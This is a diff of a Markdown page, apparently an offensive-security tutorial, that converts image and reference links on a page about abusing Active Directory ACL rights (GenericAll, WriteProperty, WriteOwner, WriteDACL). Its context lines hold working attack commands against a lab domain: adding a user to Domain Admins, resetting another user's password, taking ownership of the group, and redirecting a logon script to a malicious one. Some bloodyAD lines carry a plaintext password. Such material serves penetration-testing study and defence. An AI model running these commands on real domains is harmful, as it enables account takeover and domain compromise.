@@ -8,7 +8,7 @@ Active Directory objects such as users and groups are securable objects and DACL
 
 An example of ACEs for the "Domain Admins" securable object can be seen here:
 
-![](<../../.gitbook/assets/Screenshot from 2018-11-08 20-21-25.png>)
+![[Screenshot from 2018-11-08 20-21-25.png]]
 
 Some of the Active Directory object permissions and types that we as attackers are interested in:
 
@@ -34,7 +34,7 @@ Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.ActiveDirectoryRigh
 
 We can see that indeed our user `spotless` has the `GenericAll` rights, effectively enabling the attacker to take over the account:
 
-![](<../../.gitbook/assets/Screenshot from 2018-11-07 20-19-43.png>)
+![[Screenshot from 2018-11-07 20-19-43.png]]
 
 Linux alternative with [bloodyAD](https://github.com/CravateRouge/bloodyAD):
 
@@ -44,7 +44,7 @@ bloodyAD -u spotless -p 'totoTOTOtoto1234*' -d offense.local --host 10.100.10.5 
 
 We can reset user's `delegate` password without knowing the current password:
 
-![](<../../.gitbook/assets/Screenshot from 2018-11-07 20-21-30 (1).png>)
+![[Screenshot from 2018-11-07 20-21-30 (1).png]]
 
 Linux alternative with [bloodyAD](https://github.com/CravateRouge/bloodyAD):
 
@@ -60,7 +60,7 @@ Let's see if `Domain admins` group has any weak permissions. First of, let's get
 Get-NetGroup "domain admins" -FullData
 ```
 
-![](<../../.gitbook/assets/Screenshot from 2018-11-08 09-50-20.png>)
+![[Screenshot from 2018-11-08 09-50-20.png]]
 
 ```csharp
  Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local"}
@@ -68,7 +68,7 @@ Get-NetGroup "domain admins" -FullData
 
 We can see that our attacking user `spotless` has `GenericAll` rights once again:
 
-![](<../../.gitbook/assets/Screenshot from 2018-11-08 09-52-10.png>)
+![[Screenshot from 2018-11-08 09-52-10.png]]
 
 Linux alternative with [bloodyAD](https://github.com/CravateRouge/bloodyAD):
 
@@ -82,7 +82,7 @@ Effectively, this allows us to add ourselves (the user `spotless`) to the `Domai
 net group "domain admins" spotless /add /domain
 ```
 
-![](<../../.gitbook/assets/Peek 2018-11-08 10-07.gif>)
+![[Peek 2018-11-08 10-07.gif]]
 
 Same could be achieved with Active Directory or PowerSploit module:
 
@@ -108,7 +108,7 @@ If you have these privileges on a Computer object, you can pull [Kerberos Resour
 
 If our controlled user has `WriteProperty` right on `All` objects for `Domain Admin` group:
 
-![](<../../.gitbook/assets/Screenshot from 2018-11-08 11-11-11.png>)
+![[Screenshot from 2018-11-08 11-11-11.png]]
 
 We can again add ourselves to the `Domain Admins` group and escalate privileges:
 
@@ -116,7 +116,7 @@ We can again add ourselves to the `Domain Admins` group and escalate privileges:
 net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
 ```
 
-![](<../../.gitbook/assets/Screenshot from 2018-11-08 11-06-32.png>)
+![[Screenshot from 2018-11-08 11-06-32.png]]
 
 Linux alternative with [bloodyAD](https://github.com/CravateRouge/bloodyAD):
 
@@ -128,13 +128,13 @@ bloodyAD -u spotless -p 'totoTOTOtoto1234*' -d offense.local --host 10.100.10.5 
 
 Another privilege that enables the attacker adding themselves to a group:
 
-![](<../../.gitbook/assets/Screenshot from 2018-11-08 11-23-52.png>)
+![[Screenshot from 2018-11-08 11-23-52.png]]
 
 ```csharp
 net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
 ```
 
-![](<../../.gitbook/assets/Screenshot from 2018-11-08 11-25-23.png>)
+![[Screenshot from 2018-11-08 11-25-23.png]]
 
 Linux alternative with [bloodyAD](https://github.com/CravateRouge/bloodyAD):
 
@@ -150,13 +150,13 @@ One more privilege that enables the attacker adding themselves to a group:
 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
 ```
 
-![](<../../.gitbook/assets/Screenshot from 2018-11-08 15-21-35.png>)
+![[Screenshot from 2018-11-08 15-21-35.png]]
 
 ```csharp
 net group "domain admins" spotless /add /domain
 ```
 
-![](<../../.gitbook/assets/Screenshot from 2018-11-08 15-22-50.png>)
+![[Screenshot from 2018-11-08 15-22-50.png]]
 
 Linux alternative with [bloodyAD](https://github.com/CravateRouge/bloodyAD):
 
@@ -172,7 +172,7 @@ If we have `ExtendedRight` on `User-Force-Change-Password` object type, we can r
 Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
 ```
 
-![](<../../.gitbook/assets/Screenshot from 2018-11-08 12-30-11.png>)
+![[Screenshot from 2018-11-08 12-30-11.png]]
 
 Doing the same with powerview:
 
@@ -180,7 +180,7 @@ Doing the same with powerview:
 Set-DomainUserPassword -Identity delegate -Verbose
 ```
 
-![](<../../.gitbook/assets/Screenshot from 2018-11-08 12-31-52.png>)
+![[Screenshot from 2018-11-08 12-31-52.png]]
 
 Another method that does not require fiddling with password-secure-string conversion:
 
@@ -189,7 +189,7 @@ $c = Get-Credential
 Set-DomainUserPassword -Identity delegate -AccountPassword $c.Password -Verbose
 ```
 
-![](<../../.gitbook/assets/Screenshot from 2018-11-08 14-11-25.png>)
+![[Screenshot from 2018-11-08 14-11-25.png]]
 
 ...or a one liner if no interactive session is not available:
 
@@ -197,7 +197,7 @@ Set-DomainUserPassword -Identity delegate -AccountPassword $c.Password -Verbose
 Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
 ```
 
-![](<../../.gitbook/assets/Screenshot from 2018-11-08 12-58-25.png>)
+![[Screenshot from 2018-11-08 12-58-25.png]]
 
 Linux alternative with [bloodyAD](https://github.com/CravateRouge/bloodyAD):
 
@@ -209,7 +209,7 @@ bloodyAD -u spotless -p 'totoTOTOtoto1234*' -d offense.local --host 10.100.10.5 
 
 Note how before the attack the owner of `Domain Admins` is `Domain Admins`:
 
-![](<../../.gitbook/assets/Screenshot from 2018-11-08 16-45-36.png>)
+![[Screenshot from 2018-11-08 16-45-36.png]]
 
 After the ACE enumeration, if we find that a user in our control has `WriteOwner` rights on `ObjectType:All`
 
@@ -217,7 +217,7 @@ After the ACE enumeration, if we find that a user in our control has `WriteOwner
 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
 ```
 
-![](<../../.gitbook/assets/Screenshot from 2018-11-08 16-45-42.png>)
+![[Screenshot from 2018-11-08 16-45-42.png]]
 
 ...we can change the `Domain Admins` object's owner to our user, which in our case is `spotless`. Note that the SID specified with `-Identity` is the SID of the `Domain Admins` group:
 
@@ -225,7 +225,7 @@ Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=o
 Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
 ```
 
-![](<../../.gitbook/assets/Screenshot from 2018-11-08 16-54-59.png>)
+![[Screenshot from 2018-11-08 16-54-59.png]]
 
 Linux alternative with [bloodyAD](https://github.com/CravateRouge/bloodyAD):
 
@@ -239,7 +239,7 @@ bloodyAD -u spotless -p 'totoTOTOtoto1234*' -d offense.local --host 10.100.10.5 
 Get-ObjectAcl -ResolveGUIDs -SamAccountName delegate | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
 ```
 
-![](<../../.gitbook/assets/Screenshot from 2018-11-08 19-12-04.png>)
+![[Screenshot from 2018-11-08 19-12-04.png]]
 
 `WriteProperty` on an `ObjectType`, which in this particular case is `Script-Path`, allows the attacker to overwrite the logon script path of the `delegate` user, which means that the next time, when the user `delegate` logs on, their system will execute our malicious script:
 
@@ -250,7 +250,7 @@ Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\
 
 Below shows the user's ~~`delegate`~~ logon script field got updated in the AD:
 
-![](<../../.gitbook/assets/Screenshot from 2018-11-08 19-13-45.png>)
+![[Screenshot from 2018-11-08 19-13-45.png]]
 
 Linux alternative with [bloodyAD](https://github.com/CravateRouge/bloodyAD):
 
@@ -262,7 +262,7 @@ bloodyAD -u spotless -p 'totoTOTOtoto1234*' -d offense.local --host 10.100.10.5 
 
 If you are the owner of a group, like I'm the owner of a `Test` AD group:
 
-![](<../../.gitbook/assets/Screenshot from 2018-11-10 19-02-57.png>)
+![[Screenshot from 2018-11-10 19-02-57.png]]
 
 Which you can of course do through powershell:
 
@@ -270,11 +270,11 @@ Which you can of course do through powershell:
 ([ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local").PSBase.get_ObjectSecurity().GetOwner([System.Security.Principal.NTAccount]).Value
 ```
 
-![](<../../.gitbook/assets/Screenshot from 2018-11-10 19-29-27.png>)
+![[Screenshot from 2018-11-10 19-29-27.png]]
 
 And you have a `WriteDACL` on that AD object:
 
-![](<../../.gitbook/assets/Screenshot from 2018-11-10 19-07-16.png>)
+![[Screenshot from 2018-11-10 19-07-16.png]]
 
 Linux alternative with [bloodyAD](https://github.com/CravateRouge/bloodyAD):
 
@@ -300,7 +300,7 @@ bloodyAD -u spotless -p 'totoTOTOtoto1234*' -d offense.local --host 10.100.10.5 
 
 Which means you now fully control the AD object:
 
-![](<../../.gitbook/assets/Screenshot from 2018-11-10 19-02-49.png>)
+![[Screenshot from 2018-11-10 19-02-49.png]]
 
 This effectively means that you can now add new users to the group.
 
@@ -314,18 +314,18 @@ $acl.AddAccessRule($ace)
 Set-Acl -Path $path -AclObject $acl
 ```
 
-![](<../../.gitbook/assets/Screenshot from 2018-11-10 19-09-08.png>)
+![[Screenshot from 2018-11-10 19-09-08.png]]
 
 ## References
 
-{% embed url="https://wald0.com/?p=112" %}
+[wald0.com/?p=112](https://wald0.com/?p=112)
 
-{% embed url="https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2" %}
+[docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
 
-{% embed url="https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/" %}
+[blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
 
-{% embed url="https://adsecurity.org/?p=3658" %}
+[adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
 
-{% embed url="https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_" %}
+[docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_](https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
 
 [PowerView Tricks](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
